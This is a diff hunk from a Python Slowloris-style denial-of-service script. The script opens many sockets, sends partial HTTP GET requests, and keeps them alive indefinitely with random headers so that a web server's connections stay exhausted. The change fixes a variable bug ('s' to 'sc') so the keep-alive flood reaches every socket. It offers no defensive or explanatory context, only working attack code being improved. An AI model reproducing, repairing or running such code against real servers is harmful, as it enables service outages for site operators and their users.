@@ -29,14 +29,14 @@ for _ in range(socket_count):
     list_of_sockets.append(s)
 consolesend("setting up the sockets...")
 for sc in list_of_sockets:
-    s.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 2000)).encode("utf-8"))
+    sc.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 2000)).encode("utf-8"))
     for header in regular_headers:
         sc.send(bytes("{}\r\n".format(header).encode("utf-8")))
 while True:
     consolesend("sending keep-alive headers...")
     for sc in list_of_sockets:
         try:
-            s.send("X-a: {}\r\n".format(random.randint(1, 5000)).encode("utf-8"))
+            sc.send("X-a: {}\r\n".format(random.randint(1, 5000)).encode("utf-8"))
         except socket.error:
             list_of_sockets.remove(s)
             try:
